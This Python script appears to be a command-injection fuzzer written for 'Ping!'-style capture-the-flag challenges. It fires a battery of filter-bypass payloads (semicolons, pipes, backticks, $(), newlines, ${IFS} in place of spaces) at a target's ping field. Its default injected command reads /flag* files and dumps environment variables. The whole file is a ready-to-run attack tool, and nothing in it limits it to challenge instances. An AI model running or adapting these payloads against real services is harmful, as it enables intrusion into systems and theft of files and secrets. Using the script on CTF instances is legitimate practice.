#!/usr/bin/env python3
"""Filter-bypass fuzzer for "Ping!"-style command injection challenges.

These GZCTF challenges typically expose a small web form that shells out to
`ping <user-controlled ip>`, then progressively blacklist more shell
metacharacters at each level (';', '|', '&', '$', '`', '>', spaces, ...).
This script tries a battery of known bypass techniques against one running
challenge instance and reports which one worked and whether a flag pattern
showed up in the response.

Example:
    python3 scripts/ping_bypass.py \\
        --url http://1.2.3.4:31337/ \\
        --param ip \\
        --content-type form \\
        --cmd "cat /flag* 2>/dev/null || cat flag* 2>/dev/null || env"

Add --list to just print the payloads without sending anything.
"""
import argparse
import re
import sys
import time

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DEFAULT_CMD = "cat /flag* 2>/dev/null; cat flag* 2>/dev/null; env | grep -i flag"
DEFAULT_FLAG_RE = r"flag\{[^{}]{1,200}\}"


def ifs_variant(cmd: str) -> str:
    return cmd.replace(" ", "${IFS}")


def brace_variant(cmd: str) -> str:
    # {cat,/flag} style, only really useful for single simple commands
    parts = cmd.split(" ")
    return "{" + ",".join(parts) + "}"


def build_payloads(base_ip: str, cmd: str):
    ifs_cmd = ifs_variant(cmd)
    return [
        ("baseline (no injection)", base_ip),
        ("semicolon", f"{base_ip}; {cmd}"),
        ("semicolon no space", f"{base_ip};{cmd}"),
        ("pipe", f"{base_ip}| {cmd}"),
        ("logical and", f"{base_ip} && {cmd}"),
        ("logical or (force ping to fail first)", f"{base_ip}xx || {cmd}"),
        ("background", f"{base_ip} & {cmd}"),
        ("backtick substitution", f"{base_ip} `{cmd}`"),
        ("dollar-paren substitution", f"{base_ip} $({cmd})"),
        ("newline (raw \\n)", f"{base_ip}\n{cmd}"),
        ("newline (url-encoded %0a, requests will re-encode)", f"{base_ip}\n{cmd}"),
        ("CRLF", f"{base_ip}\r\n{cmd}"),
        ("semicolon + $IFS for spaces", f"{base_ip};{ifs_cmd}"),
        ("newline + $IFS for spaces", f"{base_ip}\n{ifs_cmd}"),
        ("tab instead of space after ;", f"{base_ip};\t{cmd}"),
        ("multiple newlines", f"{base_ip}\n\n{cmd}\n"),
    ]


def send(url, method, content_type, param, payload, timeout, extra_headers):
    if content_type == "json":
        kwargs = {"json": {param: payload}}
    else:
        kwargs = {"data": {param: payload}}
    fn = requests.post if method.upper() == "POST" else requests.get
    if method.upper() == "GET":
        kwargs = {"params": {param: payload}}
    return fn(url, timeout=timeout, verify=False, headers=extra_headers, **kwargs)


def main():
    p = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("--url", required=True, help="challenge instance URL, e.g. http://1.2.3.4:31337/")
    p.add_argument("--param", default="ip", help="vulnerable form/JSON field name (default: ip)")
    p.add_argument("--method", default="POST", choices=["GET", "POST"])
    p.add_argument("--content-type", default="form", choices=["form", "json"])
    p.add_argument("--base-ip", default="127.0.0.1")
    p.add_argument("--cmd", default=DEFAULT_CMD)
    p.add_argument("--flag-regex", default=DEFAULT_FLAG_RE)
    p.add_argument("--timeout", type=float, default=8.0)
    p.add_argument("--delay", type=float, default=0.3, help="seconds between attempts")
    p.add_argument("--cookie", default="", help="optional 'name=value' cookie header if the instance needs auth")
    p.add_argument("--list", action="store_true", help="print payloads and exit, don't send anything")
    args = p.parse_args()

    headers = {}
    if args.cookie:
        headers["Cookie"] = args.cookie

    payloads = build_payloads(args.base_ip, args.cmd)

    if args.list:
        for name, payload in payloads:
            print(f"[{name}]\n{payload!r}\n")
        return

    flag_re = re.compile(args.flag_regex)

    for name, payload in payloads:
        try:
            r = send(args.url, args.method, args.content_type, args.param, payload, args.timeout, headers)
        except requests.RequestException as e:
            print(f"[{name}] request error: {e}")
            time.sleep(args.delay)
            continue

        body = r.text
        match = flag_re.search(body)
        status = f"HTTP {r.status_code}, {len(body)} bytes"
        if match:
            print(f"[{name}] {status}  ***** FLAG FOUND: {match.group(0)} *****")
            print(f"    payload: {payload!r}")
            return
        else:
            snippet = re.sub(r"\s+", " ", body).strip()[:160]
            print(f"[{name}] {status}  snippet: {snippet!r}")
        time.sleep(args.delay)

    print("\nNo flag pattern matched any payload. Things to try next:")
    print("  - pass --cmd with a different read command (ls /, cat /app/*, id, whoami)")
    print("  - the challenge may block the char you still need; run --list and hand-craft one")
    print("  - it might be blind: watch response TIMING with --cmd 'sleep 5' instead of a flag read")
    print("  - check --flag-regex matches this game's actual flag format")


if __name__ == "__main__":
    main()
